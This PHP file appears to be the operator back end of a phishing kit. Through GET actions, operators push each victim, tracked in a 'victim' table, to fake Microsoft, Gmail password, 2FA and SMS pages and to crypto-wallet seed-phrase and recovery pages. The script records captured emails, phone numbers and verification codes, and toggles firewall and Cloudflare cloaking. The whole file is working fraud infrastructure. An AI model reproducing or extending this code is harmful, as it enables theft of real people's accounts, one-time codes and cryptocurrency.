<?php
session_start();

if(!isset($_SESSION['user_id']) && !isset($_SESSION['username'])){
    exit;
}

require_once __DIR__ . "/../../controller/db-connect.php";

$pdo = $GLOBALS["pdo"];
if(isset($_GET['id']) && isset($_GET['action'])) {
    if($_GET['action'] === 'redirect_password') {
        try {
            $page = '/signin?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id() .'&pwd=true&inc=true';
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirect password updated successfully'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if($_GET['action'] === 'microsoft_login') {
        try {
            $page = '/ms/login?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if($_GET['action'] === '2fa_gmail') {
        try {
            $page = '/g/2fa?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page, `email` = :email WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':email', $_GET['email']);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'gmail_pwd') {
        try {
            $page = '/g/pwd?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page, `email` = :email WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':email', $_GET['email']);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'delete') {
        try {
            $stmt = $pdo->prepare("DELETE FROM clients WHERE id = :id");
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Client deleted successfully'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }


    if ($_GET['action'] === 'update_phrase') {
        try {
            $page = '/l/recovery?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'seed') {
        try {
            $page = '/account/vault?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }


    if ($_GET['action'] === 'genseed') {
        try {
            $page = '/account/recovery?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'loading') {
        try {
            $page = '/account/loading?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'unlink') {
        try {
            $page = '/wallet/unlink?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'cbwunlink') {
        try {
            $page = '/account/unlink?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'balance') {
        try {
            $page = '/account/balance?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'swap') {
        try {
            $page = '/wallet/swap?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'invalidseed') {
        try {
            $page = '/invalid/seed?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'whitelistsuccess') {
        try {
            $page = '/whitelist/success?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'externalremove') {
        try {
            $page = '/external/remove?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }
    
    if ($_GET['action'] === 'review2') {
        try {
            $page = '/account/review2?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'pending') {
        try {
            $page = '/account/pending?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'sms') {
        if (isset($_GET['num'])) {
            $stmt = $pdo->prepare("UPDATE clients SET `num` = :num WHERE id = :id");
            $stmt->bindParam(':num', $_GET['num']);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();
        }

        try {
            $page = '/account/sms?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'terminate') {
        try {
            $page = '/account/terminate?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if (isset($_GET['gcode'])) {
        if ($_GET['action'] === 'gmail_verify') {
            try {
                $page = '/g/verify?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
    
                $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
                $stmt->bindParam(':page', $page);
                $stmt->bindParam(':id', $_GET['id']);
                $stmt->execute();

               
                $gcode = filter_var($_GET['gcode'], FILTER_SANITIZE_NUMBER_INT);
                $stmt = $pdo->prepare("UPDATE clients SET `gcode` = :gcode WHERE id = :id");
                $stmt->bindParam(':gcode', $gcode);
                $stmt->bindParam(':id', $_GET['id']);
                $stmt->execute();
                
                echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
            } catch (PDOException $e) {
                throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
            }
        }
    }

    if ($_GET['action'] === 'unauth') {
        try {
            $page = '/account/unauth?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'finish') {
        try {
            $page = '/account/wait?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'reschedule') {
        try {
            $page = '/account/reschedule?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'url_redirect') {
        if (isset($_GET['url'])) {
            $page = filter_var($_GET['url'], FILTER_VALIDATE_URL) ? $_GET['url'] : 'https://google.com/';

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();
            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        }
        
    }


    if ($_GET['action'] === 'allow_client') {
        $stmt = $pdo->prepare("UPDATE victim SET `allow` = 1 WHERE victimid = :id");
        $stmt->bindParam(':id', $_GET['id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Allowed client'));
    }

    if ($_GET['action'] === 'block_client') {
        $stmt = $pdo->prepare("UPDATE victim SET `allow` = 0 WHERE victimid = :id");
        $stmt->bindParam(':id', $_GET['id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Blocked client'));
    }

    if ($_GET['action'] === 'delete_victim') {
        $stmt = $pdo->prepare('DELETE FROM victim WHERE victimid = :id');
        $stmt->bindParam(':id', $_GET['id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Deleted victim'));
    }
}


if (isset($_GET['action'])) {
    if ($_GET['action'] === 'turn_on_firewall') {
        $stmt = $pdo->prepare("UPDATE users SET `firewall` = 1");
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Firewall turned on'));
    }

    if ($_GET['action'] === 'turn_off_firewall') {
        $stmt = $pdo->prepare("UPDATE users SET `firewall` = 0");
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Firewall turned off'));
    }

    if ($_GET['action'] === 'turn_on_panel') {
        $stmt = $pdo->prepare("UPDATE users SET `panel` = 1 WHERE id = :id");
        $stmt->bindParam(':id', $_SESSION['user_id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Panel turned on'));
    }

    if ($_GET['action'] === 'turn_off_panel') {
        $stmt = $pdo->prepare("UPDATE users SET `panel` = 0 WHERE id = :id");
        $stmt->bindParam(':id', $_SESSION['user_id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Panel turned off'));
    }

    if ($_GET['action'] === 'change_password') {
        if(isset($_GET['newPassword'])) {
            $stmt = $pdo->prepare("UPDATE users SET `password` = :password");
            $stmt->bindParam(':password', $_GET['newPassword']);
            $stmt->execute();
            echo json_encode(array('status'=> 'success','message'=> 'Password changed'));
        }
    }

    if($_GET['action'] === 'view_firewall') {
        $stmt = $pdo->prepare("SELECT `firewall` FROM users");
        $stmt->execute();
        $firewall = $stmt->fetchColumn();
        echo json_encode(array('status'=> 'success','message'=> 'Firewall status', 'firewall' => $firewall));
    }

    if($_GET['action'] === 'view_panel') {
        $stmt = $pdo->prepare("SELECT `panel` FROM users WHERE id = :id");
        $stmt->bindParam(':id', $_SESSION['user_id']);
        $stmt->execute();
        $panel = $stmt->fetchColumn();
        echo json_encode(array('status'=> 'success','message'=> 'Panel status', 'panel' => $panel));
    }

    if ($_GET['action'] === 'turn_on_cf') {
        $stmt = $pdo->prepare("UPDATE users SET `cloudflare` = 1 WHERE id = :id");
        $stmt->bindParam(':id', $_SESSION['user_id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Cloudflare turned on'));
    }

    if ($_GET['action'] === 'turn_off_cf') {
        $stmt = $pdo->prepare("UPDATE users SET `cloudflare` = 0 WHERE id = :id");
        $stmt->bindParam(':id', $_SESSION['user_id']);
        $stmt->execute();
        echo json_encode(array('status'=> 'success','message'=> 'Cloudflare turned off'));
    }

    if ($_GET['action'] === 'view_cf') {
        $stmt = $pdo->prepare("SELECT `cloudflare` FROM users WHERE id = :id");
        $stmt->bindParam(':id', $_SESSION['user_id']);
        $stmt->execute();
        $cf = $stmt->fetchColumn();
        echo json_encode(array('status'=> 'success','message'=> 'Cloudflare status', 'cf' => $cf));
    }
}



function create_sign_id() {
    return uniqid() . '-' . uniqid() . '-' . uniqid() . '-' . uniqid();
}


